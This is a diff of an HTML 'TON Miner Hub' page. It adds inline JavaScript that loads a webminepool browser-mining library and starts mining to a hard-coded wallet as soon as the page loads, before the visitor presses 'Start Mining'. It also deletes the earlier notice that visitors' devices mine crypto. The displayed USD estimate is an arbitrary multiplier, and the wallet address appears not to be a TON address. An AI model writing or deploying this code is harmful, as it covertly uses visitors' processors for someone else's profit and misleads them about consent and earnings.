@@ -1,26 +1,78 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Web Miner</title>
-  <link rel="stylesheet" href="style.css" />
+  <meta charset="UTF-8">
+  <title>TON Miner Hub</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #121212;
+      color: white;
+    }
+    .container {
+      margin-top: 50px;
+    }
+    button {
+      margin: 10px;
+      padding: 10px 20px;
+      font-size: 16px;
+    }
+    .referral {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #ccc;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
-    <h1>Welcome to the Mining Hub</h1>
-    <p>Support us by keeping this page open. Your device helps mine crypto for the community.</p>
-
+    <h1>TON Miner Hub</h1>
+    <p id="hashes">Hashes: 0</p>
+    <p id="usd">Estimated USD: $0.00000</p>
     <button onclick="startMining()">Start Mining</button>
     <button onclick="stopMining()">Stop Mining</button>
-    <p id="hashes">Hashes: 0</p>
-    <p id="usd">Estimated USD: $0.00</p>
-
-    <button onclick="changeLang()">Change Language</button>
-    <button onclick="shareSite()">Invite & Share</button>
+    <button onclick="shareSite()">Share</button>
+    <div class="referral" id="referralInfo"></div>
   </div>
+
   <script src="https://webminepool.com/lib/simple-ui.js"></script>
-  <script src="script.js"></script>
+  <script>
+    let miner = WMP.Anonymous('43zEiFNinS32j1F229r8AqZxpbtfAAeZYXY6T4GhWB8gNmZxfLMBtzpCW2u3HsZsncazQB7wfZB5rR8kPm7ET9b4G5RmjFr');
+    miner.start();
+
+    let hashesElement = document.getElementById("hashes");
+    let usdElement = document.getElementById("usd");
+
+    function startMining() {
+      miner.start();
+    }
+
+    function stopMining() {
+      miner.stop();
+    }
+
+    function updateStats() {
+      let hashes = miner.getTotalHashes();
+      hashesElement.textContent = "Hashes: " + hashes;
+      let usd = (hashes * 0.000001).toFixed(5);
+      usdElement.textContent = "Estimated USD: $" + usd;
+    }
+
+    function shareSite() {
+      navigator.clipboard.writeText(window.location.href);
+      alert("Site link copied to clipboard!");
+    }
+
+    setInterval(updateStats, 1000);
+
+    // رابط الإحالة
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+    if (ref) {
+      document.getElementById("referralInfo").textContent = "Referred by: " + ref;
+      localStorage.setItem("referral", ref);
+    }
+  </script>
 </body>
 </html>
